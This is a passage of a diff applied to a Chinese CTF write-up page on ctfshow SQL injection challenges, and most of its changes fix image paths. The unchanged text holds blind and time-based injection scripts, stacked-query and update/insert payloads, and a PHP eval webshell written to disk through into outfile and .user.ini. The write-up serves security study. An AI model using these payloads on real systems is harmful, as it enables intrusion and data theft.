class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = &quot;select database()&quot; ctfshow_web ctfshow_flaga</span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaabc from ctfshow_flaga&quot;</span></span><br><span class="line">        params = &#123;<span class="string">&quot;u&quot;</span>: <span class="string">f&quot;if(ord(substr((<span class="subst">&#123;payload&#125;</span>), <span class="subst">&#123;i&#125;</span>, 1))&gt;<span class="subst">&#123;mid&#125;</span>, id, username)&quot;</span>&#125;</span><br><span class="line">        r = requests.get(url, params=params)</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(r.text)==<span class="number">1199</span>):</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li>
 <li><p>group by注入</p>
 <p>与上一关不同的是，这一关的把数字给过滤掉了。回忆一下，1其实和<code>true</code>是等同的并且后者同样满足加减运算规则</p>
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220829204641616.png" alt="image-20220829204641616" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829204641616.png" alt="image-20220829204641616" style="zoom:50%;">
 
 <p>所以只需将上一关涉及到数字的替换即可</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">replaceNum</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;+&#x27;</span>.join([<span class="string">&#x27;true&#x27;</span>]*num)</span><br></pre></td></tr></table></figure></li>
@@ -335,12 +360,12 @@
 <p><code>&lt;?=</code>$_GET[1]\`?&gt;`</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#x27;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &#x27;/var/www/html/1.php&#x27;;--+</span><br></pre></td></tr></table></figure>
 
-<p>![image-20220829215532144](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220829215532144.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829215532144.png" alt="image-20220829215532144"></p>
 </li>
 <li><p><strong>堆叠注入</strong></p>
-<p>![image-20220829220430918](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220829220430918.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829220430918.png" alt="image-20220829220430918"></p>
 <p>过滤</p>
-<p>![image-20220829220448528](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220829220448528.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829220448528.png" alt="image-20220829220448528"></p>
 </li>
 </ol>
 <p>前面的表名和列名可以用show来替换select</p>
@@ -349,7 +374,7 @@
 <p>最后的select利用的是handler：(另一种方法是<strong>预处理语句</strong>)</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; <span class="operator">=</span> <span class="operator">|</span> <span class="operator">&lt;=</span> <span class="operator">|</span> <span class="operator">&gt;=</span> <span class="operator">|</span> <span class="operator">&lt;</span> <span class="operator">|</span> <span class="operator">&gt;</span> &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; <span class="keyword">FIRST</span> <span class="operator">|</span> NEXT <span class="operator">|</span> PREV <span class="operator">|</span> <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; <span class="keyword">FIRST</span> <span class="operator">|</span> NEXT &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure>
 
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220829221912523.png" alt="image-20220829221912523" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829221912523.png" alt="image-20220829221912523" style="zoom:50%;">
 
 <p><strong>payload</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=&#x27;;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;</span><br></pre></td></tr></table></figure>
@@ -362,7 +387,7 @@
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/geaozhang/p/9891338.html">https://www.cnblogs.com/geaozhang/p/9891338.html</a></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 定义预处理语句</span><br><span class="line"><span class="keyword">PREPARE</span> stmt_name <span class="keyword">FROM</span> preparable_stmt;</span><br><span class="line"># 执行预处理语句</span><br><span class="line"><span class="keyword">EXECUTE</span> stmt_name [<span class="keyword">USING</span> <span class="variable">@var</span>_name [, <span class="variable">@var</span>_name] ...];</span><br><span class="line"># 删除(释放)定义</span><br><span class="line">&#123;<span class="keyword">DEALLOCATE</span> <span class="operator">|</span> <span class="keyword">DROP</span>&#125; <span class="keyword">PREPARE</span> stmt_name;</span><br></pre></td></tr></table></figure>
 
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220829224021570.png" alt="image-20220829224021570" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829224021570.png" alt="image-20220829224021570" style="zoom:50%;">
 
 <p>对于上一关使用预处理语句的话，因为preparable_stmt是一个字符串，所以可以通过拼接的方式来绕过敏感函数</p>
 <p>比如</p>
@@ -372,17 +397,17 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;prepare a from 0x73686f77207461626c6573;execute a;    #ctfsh_ow_flagas</span><br><span class="line">&#x27;;prepare a from 0x646573632063746673685f6f775f666c61676173;execute a;    # flagasb</span><br><span class="line">&#x27;;prepare a from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;execute a;</span><br></pre></td></tr></table></figure></li>
 <li><p><strong>堆叠注入</strong></p>
 <p>首先看过滤，比之前多了一个逗号，之前的payload还可以用。而且这次sql语句中直接给出了表名和字段名</p>
-<p>![image-20220831222751226](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220831222751226.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831222751226.png" alt="image-20220831222751226"></p>
 <p>查找原来的字段发现已经不在里头了</p>
 </li>
 </ol>
-<p>![image-20220831222707507](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220831222707507.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831222707507.png" alt="image-20220831222707507"></p>
 <p>这道题考查的是sql的<strong>存储过程</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">存储程序（Stored Procedure）是一种在数据库中存储复杂程序，以便外部程序调用的一种数据库对象。</span><br><span class="line"></span><br><span class="line">存储过程是为了完成特定功能的SQL语句集，经编译创建并保存在数据库中，用户可通过指定存储过程的名字并给定参数(需要时)来调用执行。</span><br><span class="line"></span><br><span class="line">存储过程思想上很简单，就是数据库 SQL 语言层面的代码封装与重用。</span><br><span class="line">调用： call function()</span><br></pre></td></tr></table></figure>
 
 <p>也就是可以预定义一些函数来方便调用。而这些函数存在与<code>information_schema.routines</code>表中，按常规直接去查</p>
 <p>已经发现</p>
-<p>![image-20220831224759340](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220831224759340.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831224759340.png" alt="image-20220831224759340"></p>
 <p>也可以</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;call getFlag();</span><br></pre></td></tr></table></figure>
 
@@ -391,19 +416,19 @@
 <ol start="231">
 <li><p>update注入</p>
 <p>利用了一个update重复给字段赋值的特性，最后呈现出来的结果随后面的字段，所以根据这个特性我们就可以将敏感数据回显到可见字段上</p>
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220831230413007.png" alt="image-20220831230413007" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831230413007.png" alt="image-20220831230413007" style="zoom:50%;">
 
 <p>注意闭合引号</p>
 <p><strong>payload</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">password=1&#x27;, username=database()%23&amp;username=1</span><br><span class="line">password=1&#x27;, username=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;username=1</span><br><span class="line">password=1&#x27;, username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flaga&#x27;)%23&amp;username=1</span><br><span class="line">password=1&#x27;, username=(select group_concat(flagas) from flaga)%23&amp;username=1</span><br></pre></td></tr></table></figure></li>
 <li><p>update注入</p>
-<p>![image-20220831231356971](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220831231356971.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831231356971.png" alt="image-20220831231356971"></p>
 </li>
 </ol>
 <p>前面多了个md5和括号，闭合即可<code>&#39;)</code></p>
 <ol start="233">
 <li><p><strong>update注入</strong></p>
-<p>![image-20220831235747598](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220831235747598.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831235747598.png" alt="image-20220831235747598"></p>
 <p>和之前一样也没有过滤，sql语句也一样，但是没有回显变化。尝试盲注</p>
 <p>发现在<code>http://230a1b50-8335-4eb0-9629-4a988a675b30.challenge.ctf.show/api/</code>页面存在时间延迟，直接打</p>
 <p>还想复杂了，直接跟select一样，不过需要注意的一点是，update查询是<strong>一行一行查询</strong>，每行都会触发一个sleep函数，所以要选小一点</p>
@@ -415,7 +440,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://0346fc96-8f6a-4f38-87d6-7a77545eb2a7.challenge.ctf.show/api/?page=1&amp;limit=10&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        <span class="comment"># ctfstow&#123;34fcde14-25fa-467c-8f50-73f171dbd3b5&#125;</span></span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag233333&#x27;&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(flagass233) from flag233333&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;select database()&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">f&quot;1&#x27;, pass=if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>, sleep(0.05), 1)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">0.9</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li>
 <li><p>update注入</p>
 <p>这道题过滤了引号</p>
-<p>![image-20220901090838288](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220901090838288.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901090838288.png" alt="image-20220901090838288"></p>
 </li>
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update ctfshow_user set pass = &#x27;&#123;$password&#125;&#x27; where username = &#x27;&#123;$username&#125;&#x27;;</span><br></pre></td></tr></table></figure>
@@ -428,9 +453,9 @@
 <p>过滤了or和单引号。之前的payload中因为存在<code>information_schema</code>关键词，里面包含了or，所以不能继续用</p>
 <p>考虑使用<code>innodb存储引擎</code>来绕过</p>
 <p>InnoDB新增加了<strong>两张表</strong><code>innodb_index_stats</code>与<code>innodb_table_stats</code>，这两张表记录了所有新建的数据库与表</p>
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220901092843388.png" alt="image-20220901092843388" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901092843388.png" alt="image-20220901092843388" style="zoom:50%;">
 
-<p>![image-20220901092913176](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220901092913176.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901092913176.png" alt="image-20220901092913176"></p>
 <p>这两个表都可以来查库和表名，遗憾的是并没有字段名可以查到。需要注意的是innodb这两张表位于<strong>mysql</strong>库当中</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;, pass=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database());</span><br><span class="line"># innodb_index_stats表不知道为啥没法用where #flag23a1</span><br><span class="line">哦也可以这么写</span><br><span class="line">-- 查询所有新增数据库</span><br><span class="line">select group_concat(distinct database_name) from mysql.innodb_index_stats;</span><br><span class="line">-- 查询当前数据库中的所有表名</span><br><span class="line">select group_concat(distinct table_name) from mysql.innodb_index_stats where database_name=schema();</span><br></pre></td></tr></table></figure>
 
@@ -444,10 +469,10 @@
 <p>这里把flag关键字也给过滤了，但不知道为啥可以直接打</p>
 </li>
 <li><p>insert注入</p>
-<p>![image-20220901145550324](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220901145550324.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901145550324.png" alt="image-20220901145550324"></p>
 </li>
 </ol>
-<p>![image-20220901145557375](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220901145557375.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901145557375.png" alt="image-20220901145557375"></p>
 <p>思路和select中的post注入一致，也就是闭合前面参数，注释后面的参数</p>
 <p><strong>payload</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username=whatever&#x27;, database());%23&amp;password=whatever</span><br><span class="line">username=whatever&#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database()));%23&amp;password=whatever   #flag</span><br><span class="line">username=whatever&#x27;, (select group_concat(column_name) from information_schema.columns where table_name=0x666c6167));%23&amp;password=whatever   # flagass23s3</span><br><span class="line">username=whatever&#x27;, (select flagass23s3 from flag));%23&amp;password=whatever</span><br></pre></td></tr></table></figure>
@@ -479,9 +504,9 @@
 <p>参数点为post传参，名字为id</p>
 </li>
 </ol>
-<p>![image-20220901171714517](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220901171714517.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901171714517.png" alt="image-20220901171714517"></p>
 <p>sql语句，没有过滤</p>
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220901171756099.png" alt="image-20220901171756099" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901171756099.png" alt="image-20220901171756099" style="zoom:50%;">
 
 <p>没有回显点，考虑时间盲注，注意的是时间开销上是所有记录之和</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from ctfshow_user where id = if(1=1, sleep(0.03), 1)</span><br></pre></td></tr></table></figure>
@@ -489,11 +514,11 @@
 <ol start="242">
 <li><p>file注入</p>
 <p>题面给出了一个写文件操作，filename可控</p>
-<p>![image-20220902164638250](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220902164638250.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902164638250.png" alt="image-20220902164638250"></p>
 <p>POST传参，参数为filename</p>
 </li>
 </ol>
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220902164825092.png" alt="image-20220902164825092" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902164825092.png" alt="image-20220902164825092" style="zoom:50%;">
 
 <p>这里利用到了<code>into outfile</code>后面的一些其他输出参数</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">SELECT ... INTO OUTFILE &#x27;file_name&#x27;</span><br><span class="line">        [CHARACTER SET charset_name]</span><br><span class="line">        [export_options]</span><br><span class="line"></span><br><span class="line">export_options:</span><br><span class="line">    [&#123;FIELDS | COLUMNS&#125;</span><br><span class="line">        [TERMINATED BY &#x27;string&#x27;]//分隔符</span><br><span class="line">        [[OPTIONALLY] ENCLOSED BY &#x27;char&#x27;]</span><br><span class="line">        [ESCAPED BY &#x27;char&#x27;]</span><br><span class="line">    ]</span><br><span class="line">    [LINES</span><br><span class="line">        [STARTING BY &#x27;string&#x27;]</span><br><span class="line">        [TERMINATED BY &#x27;string&#x27;]</span><br><span class="line">    ]</span><br><span class="line">----------------------------------------------------</span><br><span class="line">“OPTION”参数为可选参数选项，其可能的取值有：</span><br><span class="line"></span><br><span class="line">`FIELDS TERMINATED BY &#x27;字符串&#x27;`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。</span><br><span class="line"></span><br><span class="line">`FIELDS ENCLOSED BY &#x27;字符&#x27;`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。</span><br><span class="line"></span><br><span class="line">`FIELDS OPTIONALLY ENCLOSED BY &#x27;字符&#x27;`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。</span><br><span class="line"></span><br><span class="line">`FIELDS ESCAPED BY &#x27;字符&#x27;`：设置转义字符，只能为单个字符。默认值为“\”。</span><br><span class="line"></span><br><span class="line">`LINES STARTING BY &#x27;字符串&#x27;`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。</span><br><span class="line"></span><br><span class="line">`LINES TERMINATED BY &#x27;字符串&#x27;`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。</span><br></pre></td></tr></table></figure>
@@ -508,14 +533,14 @@
 <p>在/var/www/html/dump目录下存在一个index.php文件，所以在同目录下我们可以去通过上传.user.ini配置文件，来实现文件包含的功能。将恶意代码包含到index.php中</p>
 <p>这里比较坑的是要保证配置项<strong>单独占一行</strong>，所以还要加上换行符</p>
 <p>不然会出现这种情况</p>
-<p>![image-20220902172059797](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220902172059797.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902172059797.png" alt="image-20220902172059797"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=.user.ini&#x27;  lines starting by &#x27;auto_prepend_file = 1.txt\n&#x27;%23 #包含文件</span><br><span class="line"># 写马的话就写简化版的</span><br><span class="line">filename=1.txt&#x27; LINES STARTING BY &#x27;&lt;?= eval($_POST[1])?&gt;&#x27;%23 #注入马</span><br></pre></td></tr></table></figure></li>
 <li><p>报错注入</p>
 <p>题面，无过滤，单引号闭合</p>
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220902195304990.png" alt="image-20220902195304990" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902195304990.png" alt="image-20220902195304990" style="zoom:50%;">
 
 <p>参数点为id，注入检测时发现报错回显，可以利用报错注入</p>
-<p>![image-20220902195411798](/Users/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220902195411798.png)</p>
+<p><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902195411798.png" alt="image-20220902195411798"></p>
 </li>
 </ol>
 <p><strong>exp:</strong>  需要注意的是由于此报错注入和<code>updatexml</code>都只能<strong>爆最大32位</strong>，如果要爆出32位之后的数据，需要借助<code>mid</code>或者<code>substr</code>等切割函数进行字符截取从而显示32位以后的数据</p>
@@ -537,28 +562,28 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤updatexml extractvalue floor</span><br></pre></td></tr></table></figure></li>
 </ol>
 <p>其实还是可以继续基于floor的原理，找一个可以实现类似功能的函数即可。floor与rand搭配是用于能产生固定的序列</p>
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220902203422524.png" alt="image-20220902203422524" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902203422524.png" alt="image-20220902203422524" style="zoom:50%;">
 
 <p>floor本身用于向下取整，小数部分舍弃。试试round或者ceil。也没有问题</p>
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220902203730588.png" alt="image-20220902203730588" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902203730588.png" alt="image-20220902203730588" style="zoom:50%;">
 
 <p>把上一关的payload关键词改成ceil即可</p>
 <p>ctfshow_flagsa flag? 注意这里的字段名<code>flag?</code>里面的<code>?</code>为保留字符，所以需要包在反引号当中作为区分</p>
 <ol start="248">
 <li><p>UDF注入</p>
 <p>先把sqlmap自带的可以执行命令的UDF文件进行解码</p>
-<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/racerz/Desktop/Java Sec/代码审计/OWASP/img/image-20220904000411089.png" alt="image-20220904000411089" style="zoom:50%;">
+<img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904000411089.png" alt="image-20220904000411089" style="zoom:50%;">
 
 <p>其次便是要将这个文件放到目标机器的plugin目录下。如何查找该目录？</p>
